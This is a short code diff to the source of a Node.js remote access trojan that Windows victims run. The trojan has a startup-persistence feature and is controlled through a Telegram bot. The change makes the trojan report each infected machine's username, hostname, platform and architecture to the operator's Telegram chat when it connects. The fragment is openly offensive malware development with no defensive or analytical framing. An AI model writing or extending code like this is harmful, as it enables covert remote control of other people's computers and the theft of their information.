@@ -346,7 +346,17 @@ addToStartup().catch(err => console.error('Failed to add to startup:', err));
 // -- END_FEATURE_PERSISTENCE --
 
 // Initial connection message
-bot.sendMessage(CHAT_ID, 'RAT client started and listening for commands.').catch(err => {
+const connectedMessage = `
+✅ **Windows Device Connected!**
+
+**System Info:**
+- **User:** ${os.userInfo().username}
+- **Hostname:** ${os.hostname()}
+- **Platform:** ${os.platform()} ${os.arch()}
+
+RAT client started and listening for commands.
+`;
+bot.sendMessage(CHAT_ID, connectedMessage, { parse_mode: 'Markdown' }).catch(err => {
     console.log("Could not send initial message. Check BOT_TOKEN and CHAT_ID.", err.code, err.response.body);
     // process.exit(1);
 });
